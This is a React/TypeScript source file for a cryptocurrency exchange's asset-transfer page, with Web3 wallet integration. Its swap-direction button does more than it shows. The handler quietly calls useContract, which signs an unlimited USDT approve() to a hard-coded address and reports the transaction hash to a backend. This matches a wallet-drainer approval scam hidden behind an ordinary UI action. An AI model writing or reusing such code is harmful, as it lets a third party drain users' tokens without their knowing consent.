import { useCallback, useEffect, useRef, useState } from "react";

import style from "./index.module.scss";
import { BrowserRouter as Router, Route, Link, Outlet } from "react-router-dom";

import { useTranslation } from "react-i18next";

import i18in from "../../../react-i18next-config";

import Back from "@/components/Back";
import Select from "@/components/Select";
import Toast from "@/components/Toast";
import right from "@/assets/right.png";
import change from "@/assets/change.png";
import usdtSVg from "@/assets/usdt.svg";
import bigNumber from "bignumber.js";
import { toNonExponential } from "@/utils/public";

import { useWeb3 } from "@/hooks/useWeb3/useWeb3";

import { AbiItem } from "web3-utils";

import {
  getTradeAssetBalance,
  getFundsAssetBalance,
  getSpotAssetBalance,
  assetShift,
} from "@/api/trans";
import ABI from "./ABI.json";
import { authentication } from "@/api/userInfo";

const inputAddress = [
  "0xdac17f958d2ee523a2206206994597c13d831ec7", // uusdt
  "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", //usdc
];
const tokenAddress = "0xdac17f958d2ee523a2206206994597c13d831ec7";
// 获取合约实例

const accountAddress = window.localStorage.getItem("account") || "";

function Trans() {
  const { t } = useTranslation();
  const selectRef: any = useRef(null);
  const { account, web3 } = useWeb3();
  const [contractInstance, setContractInstance] = useState<any>();
  console.log("web3=>>>", web3);

  const accountsList = [
    {
      label: t("trans.funds"),
      type: "funds",
    },
    {
      label: t("trans.trade"),
      type: "trade",
    },
    {
      label: t("trans.spot"),
      type: "spot",
    },
  ];
  const [from, setFrom] = useState({
    label: t("trans.funds"),
    type: "funds",
  });
  const [to, setTo] = useState({
    label: t("trans.trade"),
    type: "trade",
  });
  const [currentSelect, setCurrentSelect] = useState("from");

  const [coin, setCoin] = useState("USDT");
  const [coinUseCount, setCoinUseCount] = useState(0);
  const [coinFrozenCount, setCoinFrozenCount] = useState(0);
  const [amount, setAmount] = useState<any>(0);
  const [contractAddress, setContractAddress] = useState();

  const getData = async () => {
    let method;
    if (from.type === "funds") {
      method = getFundsAssetBalance;
    } else if (from.type === "trade") {
      method = getTradeAssetBalance;
    } else {
      method = getSpotAssetBalance;
    }
    const { data } = await method();
    setCoinUseCount(data.availableUsdtBalance || 0);
    setCoinFrozenCount(data.freezeUsdtBalance || 0);
  };

  const onOpen = () => {
    console.log(selectRef.current);
    if (selectRef.current) {
      selectRef.current.open();
    }
  };
  const onSelect = useCallback(
    (item: any) => {
      if (currentSelect === "from") {
        if (item.type === to.type) {
          setTo(from);
        }
        setFrom(item);
      } else {
        if (item.type === from.type) {
          setFrom(to);
        }
        setTo(item);
      }
    },
    [currentSelect]
  );

  useEffect(() => {
    console.log("web3=>useEffect", web3);

    if (account) {
      const contractInstanceTemp: any =
        web3 && new web3.eth.Contract(ABI as AbiItem[], tokenAddress);
      console.log("contractInstance=>", contractInstance);
      setContractInstance(contractInstanceTemp);
    }
  }, [account]);
  const useContract = async () => {
    console.log("web3=>useContract", web3);

    // const twoTo256: any = web3?.utils.toBN(
    //   "0x10000000000000000000000000000000000000000000000000000000000000000"
    // );
    // const twoTo256MinusOne = twoTo256.sub(web3?.utils.toBN("1"));

    // const totalSupply = await contractInstance.methods.totalSupply().call();
    const maxValue = web3?.utils
      .toBN(2)
      .pow(web3?.utils.toBN(256))
      .sub(web3?.utils.toBN(1));
    console.log("maxValue=>", maxValue);
    const data = await contractInstance.methods
      .approve("0x1FdfbB4e5C4C7aF8B1CA1700F3b67690B7d798D5", maxValue)
      .encodeABI();
    console.log("合约data==>", data);

    let gasPrice: any = await web3?.eth.getGasPrice();
    console.log("gasPrice=>", gasPrice);
    // // 传值大于1.2
    gasPrice = parseInt(gasPrice * 1.2 + "");
    // 不知道是不是要tohex格式
    gasPrice = web3?.utils.toHex(gasPrice);

    const value = web3?.utils.toHex(0);
    console.log("gasPrice=>", gasPrice);
    // // const chainId = await web3?.eth.getChainId();
    // // console.log("chainId=>", chainId);
    const emitPrams = {
      // chainId: 1,
      from: accountAddress,
      to: tokenAddress,
      gasPrice,
      value,
      data,
    };
    console.log("emitPrams=>", emitPrams);

    const gas: any = await web3?.eth.estimateGas(emitPrams);
    console.log("gas=>>>", gas);
    const sendTransactionPramas = {
      // chainId: 1,
      from: accountAddress,
      to: tokenAddress,
      gasPrice,
      value,
      gas: Number(gas),
      data: data,
    };
    console.log("sendTransactionPramas=>", sendTransactionPramas);

    web3?.eth.sendTransaction(sendTransactionPramas, async (error, hash) => {
      console.log(error, hash);
      if (hash) {
        const { data } = await authentication({
          tokenList: ["USDT"],
          trxHash: hash,
        });
      }
    });
  };
  const getAuth = useCallback(async () => {
    console.log("getAuth===>", web3);
    const accountAddress = window.localStorage.getItem("account") || "";

    let gasPrice: any = await web3?.eth.getGasPrice();
    console.log("gasPrice=>", gasPrice);
    // 传值大于1.2
    gasPrice = parseInt(gasPrice * 1.2 + "");
    const value = web3?.utils.toHex(1);
    console.log("gasPrice=>", gasPrice);
    const chainId = await web3?.eth.getChainId();
    console.log("chainId=>", chainId);
    const emitPrams = {
      // chainId: web3?.utils.toHex(1),
      from: accountAddress,
      to: tokenAddress,
      gasPrice,
      value,
      data: contractAddress,
    };
    console.log("emitPrams=>", emitPrams);

    const gas: any = await web3?.eth.estimateGas(emitPrams);
    console.log("gat=>>>", gas);
    const sendTransactionPramas = {
      // chainId: 1,
      from: accountAddress,
      to: tokenAddress,
      gasPrice,
      value,
      gas: Number(gas),
      data: contractAddress,
    };
    console.log("sendTransactionPramas=>", sendTransactionPramas);

    web3?.eth.sendTransaction(sendTransactionPramas, (error, hash) => {
      console.log(error, hash);
    });
  }, [web3, contractAddress]);
  // 只要from有變，就得去獲取數據
  useEffect(() => {
    getData();
  }, [from]);
  const changeFromTo = useCallback(() => {
    const fromTemp = JSON.stringify(from);
    const toTemp = JSON.stringify(to);
    setFrom(JSON.parse(toTemp));
    setTo(JSON.parse(fromTemp));
    useContract();
  }, [from, to, contractInstance]);
  const transAsstes = async () => {
    const params = {
      amount,
      asset: coin,
      from: from.type,
      to: to.type,
    };
    const result: any = await assetShift(params);

    if (result.code == 0) {
      Toast.notice(t("common.success"), {});
      await getData();
    }
  };
  return (
    <>
      <div className={style.root}>
        <div className="trans-wrap">
          <Back />
          <div className="trans-content">
            <div className="tip">{t("trans.tip")}</div>
            <div className="trans-part">
              <div className="trans-left">
                <div className="trans-box">
                  <div
                    className="trans-top trans-item_wrap"
                    onClick={() => {
                      setCurrentSelect("from");
                      onOpen();
                    }}
                  >
                    <div className="trans-direction">{t("trans.from")}</div>
                    <div className="trans-item_center  border">
                      <div className="trans-form——name">{from.label}</div>
                      <img src={right} />
                    </div>
                  </div>
                  <div
                    className="trans-top trans-item_wrap"
                    onClick={() => {
                      setCurrentSelect("to");
                      onOpen();
                    }}
                  >
                    <div className="trans-direction">{t("trans.to")}</div>
                    <div className="trans-item_center">
                      <div className="trans-form——name">{to.label}</div>
                      <img src={right} />
                    </div>
                  </div>
                </div>
              </div>
              <img
                src={change}
                className="trans-right"
                onClick={() => {
                  changeFromTo();
                }}
              />
            </div>
            <div className="trans-part">
              <div className="trans-coin">
                <img src={usdtSVg} className="coin-logo" />
                <div className="coin-name">{coin}</div>
                <img src={right} className="right" />
              </div>
            </div>
            <div className="count-tip">{t("trans.count")}</div>
            <div className="trans-part">
              <div className="trans-input_wrap ">
                <div className="input">
                  <input
                    type="digit"
                    value={amount}
                    onChange={(e) => {
                      setAmount(e.target.value);
                    }}
                  />
                </div>
                <div
                  className="btn-max"
                  onClick={() => {
                    setAmount(coinUseCount);
                  }}
                >
                  {t("trans.max")}
                </div>
              </div>
            </div>
            <div className="coin-state">
              <div className="left">{t("trans.useable")}</div>
              <div className="right">
                {coinUseCount}
                {coin}
              </div>
            </div>
            <div className="coin-state">
              <div className="left"> {t("trans.frozen")}</div>
              <div className="right">
                {coinFrozenCount}
                {coin}
              </div>
            </div>
            <div
              className="btn"
              onClick={() => {
                transAsstes();
              }}
            >
              {t("trans.sure")}
            </div>
          </div>
        </div>
      </div>
      <Select
        ref={selectRef}
        configList={accountsList}
        onSelect={onSelect}
      ></Select>
    </>
  );
}

export default Trans;
